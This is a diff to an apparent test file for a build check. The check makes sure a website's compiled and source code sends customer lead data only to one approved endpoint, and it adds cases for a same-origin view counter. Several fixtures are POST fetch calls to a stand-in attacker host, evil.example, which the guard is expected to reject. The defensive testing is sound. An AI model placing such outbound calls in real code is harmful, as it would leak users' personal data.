@@ -35,14 +35,31 @@ check(compiledLeadEndpointPresent([
   { path: 'dist/_next/static/chunks/lead.js', content: `fetch("${endpoint}",{method:"POST"})` },
   { path: 'dist/_next/static/chunks/main-test.js', content: 'fetch(t,{credentials:"same-origin",method:n.method||"GET",headers:Object.assign({},n.headers,{"x-nextjs-data":"1"})})' },
 ], endpoint), true)
+const safeCompiledViewsPost = 'fetch("/model-views.php",{method:"POST",credentials:"same-origin",cache:"no-store",referrerPolicy:"no-referrer",headers:{"Content-Type":"application/json; charset=utf-8",Accept:"application/json"},body:JSON.stringify({modelId:e})})'
+check(compiledLeadEndpointPresent([
+  { path: 'dist/_next/static/chunks/lead.js', content: `fetch("${endpoint}",{method:"POST"})` },
+  { path: 'dist/_next/static/chunks/model-views.js', content: safeCompiledViewsPost },
+], endpoint), true)
+check(compiledLeadEndpointPresent([
+  { path: 'dist/_next/static/chunks/lead.js', content: `fetch("${endpoint}",{method:"POST"})` },
+  { path: 'dist/_next/static/chunks/model-views.js', content: safeCompiledViewsPost.replace('modelId:e', 'modelId:e,phone:t') },
+], endpoint), false)
+check(compiledLeadEndpointPresent([
+  { path: 'dist/_next/static/chunks/lead.js', content: `fetch("${endpoint}",{method:"POST"})` },
+  { path: 'dist/_next/static/chunks/model-views.js', content: 'fetch("https://evil.example/model-views.php",{method:"POST"})' },
+], endpoint), false)
 
 const sourceFiles = [
   { path: 'src/lib/leads.ts', content: `const leadEndpoint="${endpoint}";fetch(leadEndpoint,{method:'POST'})` },
+  { path: 'src/lib/model-view-counter.ts', content: `fetch('/model-views.php',{method:'POST',credentials:'same-origin',cache:'no-store',referrerPolicy:'no-referrer',headers:{'Content-Type':'application/json; charset=utf-8',Accept:'application/json'},body:JSON.stringify({modelId})})` },
   { path: 'src/lib/model-pdf.ts', content: "fetch('/fonts/font.ttf')" },
   { path: 'src/components/Weather.tsx', content: "fetch('/weather/city.json',{method:'GET'})" },
   { path: 'src/components/forms/OnlineLeadForm.tsx', content: 'async function submit(){ await sendLead(lead); } const form = <form onSubmit={submit}></form>' },
 ]
 check(sourceLeadTransportAllowed(sourceFiles), true)
+check(sourceLeadTransportAllowed(sourceFiles.filter(file => file.path !== 'src/lib/model-view-counter.ts')), false)
+check(sourceLeadTransportAllowed([...sourceFiles.filter(file => file.path !== 'src/lib/model-view-counter.ts'), { path: 'src/lib/model-view-counter.ts', content: `fetch('/model-views.php',{method:'POST',credentials:'same-origin',cache:'no-store',referrerPolicy:'no-referrer',headers:{'Content-Type':'application/json; charset=utf-8',Accept:'application/json'},body:JSON.stringify({modelId,phone:true})})` }]), false)
+check(sourceLeadTransportAllowed([...sourceFiles.filter(file => file.path !== 'src/lib/model-view-counter.ts'), { path: 'src/components/Bad.tsx', content: `fetch('/model-views.php',{method:'POST',credentials:'same-origin'})` }]), false)
 check(sourceLeadTransportAllowed([...sourceFiles, { path: 'src/components/BadForm.tsx', content: "fetch('https://evil.example/submit',{method:'POST'})" }]), false)
 check(sourceLeadTransportAllowed([{ path: 'src/lib/leads.ts', content: `fetch("${endpoint}",{method:'POST'})` }]), false)
 check(sourceLeadTransportAllowed([{ path: 'src/lib/leads.ts', content: `fetch(leadEndpoint,{method:'POST'});fetch('https://evil.example/submit',{method:'POST'})` }]), false)
